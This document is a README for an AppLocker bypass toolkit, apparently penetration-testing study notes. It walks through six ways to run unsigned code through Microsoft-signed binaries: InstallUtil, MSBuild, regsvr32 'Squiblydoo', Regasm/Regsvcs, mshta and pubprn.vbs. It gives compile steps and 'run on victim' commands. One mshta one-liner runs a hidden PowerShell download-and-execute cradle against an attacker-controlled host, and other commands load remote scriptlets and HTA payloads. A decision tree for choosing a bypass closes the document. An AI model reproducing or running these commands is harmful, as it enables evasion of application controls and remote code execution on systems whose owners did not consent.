# AppLocker Bypass

AppLocker allows/blocks execution of files by publisher signature, path, or hash. All techniques here use Microsoft-signed binaries to execute unsigned code — AppLocker can't block what it trusts.

---

## Files

| File | Technique | Admin? | Notes |
|------|-----------|--------|-------|
| `installutil-bypass.cs` | InstallUtil.exe | No | Compile as .exe; runs PS cradle via InstallUtil |
| `msbuild-payload.xml` | MSBuild.exe | No | XML project file; inline C# executed by MSBuild |
| `squiblydoo.sct` | regsvr32.exe + scrobj.dll | No | Serve remotely; runs JScript/VBScript |
| `regsvcs-bypass.cs` | Regasm.exe / Regsvcs.exe | No (Regasm) | Compile as .dll; COM registration runs payload |

---

## Technique 1: InstallUtil (installutil-bypass.cs)

**Binary:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

The `[RunInstaller(true)]` attribute on a class causes InstallUtil to call its `Uninstall()` method. Your payload lives there.

**Compile — Visual Studio (Windows dev box):**

1. **File → New → Project → Console App (.NET Framework)** (NOT .NET Core)
   - Name: `bypass`, Framework: **.NET Framework 4.8**
2. Delete defaults, paste `installutil-bypass.cs`
3. **Right-click References → Add Reference → Browse**
   Navigate to: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`
   Click Add → OK
4. **Project → Properties → Build:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
5. **Build → Build Solution** (`Ctrl+Shift+B`)
6. Output: `bin\x64\Debug\bypass.exe`

**Alt (Windows cmd):**
```cmd
csc.exe /unsafe /platform:x64 /r:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:bypass.exe installutil-bypass.cs
```

**Run on victim:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U bypass.exe
```

---

## Technique 2: MSBuild (msbuild-payload.xml)

**Binary:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe`

MSBuild compiles and executes inline C# tasks from an XML project file. No compilation step needed on Kali — MSBuild compiles it on the target.

```bash
# Serve the file
python3 -m http.server 80

# Run on victim (download first OR run from UNC path)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\192.168.45.202\share\msbuild-payload.xml

# Or drop to disk first (if you can write to allowed paths)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\msbuild-payload.xml
```

Edit the URL inside `Execute()` before use.

---

## Technique 3: Squiblydoo — Regsvr32 (squiblydoo.sct)

**Binary:** `C:\Windows\SysWOW64\regsvr32.exe` or `C:\Windows\System32\regsvr32.exe`

Loads a remote COM scriptlet (.sct) containing JScript/VBScript. Payload served from Kali HTTP server — no file written to victim disk.

```bash
# Kali: serve the .sct file
python3 -m http.server 80

# Victim: run (no admin required)
regsvr32 /s /n /u /i:http://192.168.45.202/squiblydoo.sct scrobj.dll

# Also works with HTTPS if cert is valid, or from file share:
regsvr32 /s /n /u /i:\\192.168.45.202\share\squiblydoo.sct scrobj.dll
```

Edit the WScript.Shell command in the .sct file for your payload.

---

## Technique 4: Regasm / Regsvcs (regsvcs-bypass.cs)

**Binaries:**
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe` (no admin!)
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe` (admin)

**Compile — Visual Studio (Windows dev box):**

1. **File → New → Project → Class Library (.NET Framework)** (NOT .NET Core)
   - Name: `bypass`, Framework: **.NET Framework 4.8**
2. Delete defaults, paste `regsvcs-bypass.cs`
3. **Right-click References → Add Reference → Assemblies tab**
   Check **System.EnterpriseServices** → OK
4. **Project → Properties → Build:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
5. **Build → Build Solution** (`Ctrl+Shift+B`)
6. Output: `bin\x64\Debug\bypass.dll`

**Alt (Windows cmd):**
```cmd
csc.exe /r:System.EnterpriseServices.dll /target:library /out:bypass.dll regsvcs-bypass.cs
```

**Run on victim (triggers `[ComUnregisterFunction]`):**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U bypass.dll
:: Or (requires admin):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U bypass.dll
```

---

## Technique 5: MSHTA one-liners (no file needed)

**Binary:** `C:\Windows\System32\mshta.exe`

MSHTA runs HTA (HTML Application) files — including inline VBScript/JScript from the command line.

```bat
:: Run inline VBScript that launches PowerShell
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -w hidden -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')"",0:close")

:: Load remote HTA (no file on disk)
mshta http://192.168.45.202/payload.hta

:: From command line via /c
cmd /c mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami > C:\Windows\Temp\out.txt"",0:close")
```

---

## Technique 6: PubPrn.vbs (Windows 7/2008 → Windows 10 1803)

**Binary:** `cscript.exe` (Microsoft-signed) running `pubprn.vbs` (Microsoft-signed script)

```bat
:: Load a remote scriptlet — same .sct format as Squiblydoo
cscript //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 "script:http://192.168.45.202/squiblydoo.sct"
```

Note: Patched on Windows 10 1803+. Use on older systems.

---

## AppLocker Enumeration

Before trying bypasses, check what's actually enforced:

```powershell
# What AppLocker rules are configured?
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Is AppLocker enforcing or just auditing?
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections | Select RuleCollectionType, EnforcementMode

# Check if AppIDSvc is running (required for AppLocker enforcement)
Get-Service AppIDSvc | Select Status

# Quick check — try to run something from an allowed path
# Writable paths that AppLocker usually allows:
#   C:\Windows\Temp\           (often allowed)
#   C:\Windows\Tasks\
#   C:\ProgramData\
#   C:\Users\Public\
```

---

## Decision tree

```
AppLocker is blocking my payload...
│
├── Can I serve files from Kali? → Squiblydoo (regsvr32) — no admin, nothing on disk
│
├── Can I drop a file to C:\Windows\Temp? → MSBuild XML — no compile step needed
│
├── Can I compile on Kali first?
│   ├── Want .exe container → InstallUtil
│   └── Want .dll container → Regasm (no admin) or Regsvcs
│
└── Just need a quick command → MSHTA inline vbscript
```
